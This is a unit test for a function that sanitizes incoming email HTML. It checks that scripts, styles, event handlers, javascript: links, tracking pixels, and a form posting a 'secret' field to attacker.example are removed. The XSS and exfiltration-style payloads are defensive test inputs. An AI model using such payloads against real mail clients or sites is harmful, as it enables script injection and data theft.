import { describe, expect, test } from "bun:test";
import { sanitizeIncomingMailHtml } from "./message-hydration";

describe("incoming mail HTML", () => {
  test("removes executable content and remote tracking images", () => {
    const sanitized = sanitizeIncomingMailHtml(`
      <script>alert('xss')</script>
      <style>body { display: none }</style>
      <form action="https://attacker.example"><input name="secret"></form>
      <a href="javascript:alert(1)" onclick="alert(2)">unsafe</a>
      <a href="https://example.com/path">safe</a>
      <img src="https://tracker.example/pixel" onerror="alert(3)">
      <img src="cid:logo@example.com" style="position:fixed" alt="Logo">
    `);

    expect(sanitized).not.toContain("<script");
    expect(sanitized).not.toContain("<style");
    expect(sanitized).not.toContain("<form");
    expect(sanitized).not.toContain("javascript:");
    expect(sanitized).not.toContain("onclick");
    expect(sanitized).not.toContain("onerror");
    expect(sanitized).not.toContain("tracker.example");
    expect(sanitized).toContain('src="cid:logo@example.com"');
    expect(sanitized).toContain('href="https://example.com/path"');
    expect(sanitized).toContain('target="_blank"');
    expect(sanitized).toContain('rel="noopener noreferrer nofollow"');
  });
});
